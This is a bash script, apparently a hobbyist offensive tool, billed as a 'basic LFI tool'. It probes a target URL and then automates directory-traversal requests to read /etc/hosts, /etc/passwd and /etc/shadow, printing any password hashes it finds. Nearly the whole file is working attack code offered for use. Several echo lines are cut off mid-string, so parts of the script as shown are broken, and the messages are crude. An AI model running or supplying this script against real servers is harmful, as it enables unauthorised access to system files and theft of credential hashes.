#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'
BOLD=' \033[1m'

echo -e "${BLUE}${BOLD}T O O   B A S I C   L F I   T O O L${RESET}"
echo
echo "       ┓    •   ┓┏•       ┓"
echo "╋┏┓┏┓  ┣┓┏┓┏┓┏  ┃╋┓  ╋┏┓┏┓┃"
echo "┗┗┛┗┛  ┗┛┗┻┛┗┗  ┗┛┗  ┗┗┛┗┛┗"
echo
echo "Welcome back dude, ensure to enter the target url correctly (IT MUST FINISH BY = IN ORDER TO PERFORM THE ATT>
echo 

verbose=false
depth=5

verbose(){
if [[ $verbose == true ]]; then 
echo -e "${YELLOW}[VERBOSE] $1${RESET}"
fi 
}

show_help(){
echo "By default this program will try path traversal with common lfi. Take a look if you want to perform  a diffe>
echo " -h, --help           Display a short man"
echo " -u, --url [URL]      Specify target URL"
echo " -r, --recursion [N]  Choose recursion depth  (N has to be a integer)"
echo " -v, --verbose        Enable verbose mode"
}

if [[ $# -eq 0 ]]; then 
echo "No argument were given. Use -h to display some help"
exit 1
fi 


while [[ $# -gt 0 ]]; do
case "$1" in
        -h | --help)
show_help
exit 0
;;
        -r | --recursion)
if [[ $2 =~ ^[0-9]+$ ]]; then
depth="$2"  
shift 2
else
echo "Option -r take an number as an argument" 
exit 1
fi
;;

        -u | --url)
if [[ -n "$2" && "$2" != -* ]]; then
url="$2"
shift 2
else
echo "Dumb error : -u needs an argument"
exit 1
fi
;;
        -v | --verbose)
verbose=true
shift
;;
*)
echo "Unknown option: $1"
exit 1
;;
esac 
done 

echo "--------------------------------------------------------------"       
echo "Launching script with following parameters:"
echo "URL :${url:-not specified}"
echo "Recursion depth : $depth"
echo "--------------------------------------------------------------"
 
echo 

verbose "Requesting the server which methods are allowed..."

connexion_test=$(curl -o /dev/null -w "%{http_code}" "$url")
echo
echo "Code "$connexion_test""
echo
if [ "$connexion_test" -ge 408 ] || [ "$connexion_test" -eq 0 ]; then 
echo -e "${RED}${BOLD}Maybe you should think about having an actual connexion lmao (check your fucking interfaces >
exit 1

else

        methods=$(curl -s -I -X OPTIONS "$url" | grep  -i  "Allow:")
        if  [ -n "$methods" ]; then 
                if  echo  "$methods" | grep  -i "POST" ; then 
                verbose "${GREEN}Request POST allowed{RESET}"
        fi
        if  echo  "$methods" | grep  -i "GET" ; then 
                verbose "${GREEN}Request GET allowed${RESET}"
        fi
 if  echo "$methods" | grep -i "HEAD" ;then 
                verbose "${GREEN}Request HEAD allowed${RESET}"
        fi
 
        else 
        echo -e "${RED}${BOLD}Server sets in no sniffing mode : *womp womp sound*${RESET}"
fi
fi

echo 
echo "How deep is your love, my deer?" 
echo
echo -e "${YELLOW}If you didn't choose a recursion level it's automatically set to 5${RESET}"
echo 
for ((i=1; i<=depth; i++)); do
    query=$(printf '../%.0s' $(seq 1 $i))"etc/hosts" 
    url2="${url}${query}"
    verbose "${YELLOW}Stade ${i} recursion${RESET}"
    verbose "$url2" 
    verbose "Searching for /etc/hosts file..."
    file=$(curl -s "$url2")
    if echo "$file" | grep -q -i "localhost" ; then 
        echo -e "${GREEN}${BOLD}It seems we find something interesting${RESET}"
        print=$(curl -s "$url2")
        echo -e "${GREEN}$print${RESET}"

        verbose "Now that you know how deep is your love, you can probably fish other files such as /etc/passwd or>
        
echo
echo "Have a wonderful look dude"

        verbose "Let's try something else"
        echo
        verbose "Searching for /etc/passwd file..." 
        query2=$(printf '../%.0s' $(seq 1 $i))"etc/passwd" 
        url3="${url}${query2}"
        file2=$(curl -s "$url3")
        if echo "$file2" | grep -q -i "root" ; then
            print2=$(curl -s "$url3")
            echo "Always some interesting stones on the road"
            echo
            echo -e "${GREEN}$print2${RESET}"

            verbose "Trying to find hashed creds (basically searching for /etc/shadow)"
            query3=$(printf '../%.0s' $(seq 1 $i))"etc/shadow"
query3=$(printf '../%.0s' $(seq 1 $i))"etc/shadow"
            url4="${url}${query3}"
            file3=$(curl "$url4")
            if echo "$file3" | grep -q -i "root" ; then 
                print3=$(curl -s "$url4")
                echo -e "${GREEN}$print3${RESET}"
            else 
                verbose  "${RED}No /etc/shadow file found at this recursion level ${RESET}"
            fi
        else
            verbose  "${RED}No /etc/passwd file found.${RESET}"
        fi
    else
        verbose "${RED}Gotta dive deeper, my friend${RESET}"
    fi 
done
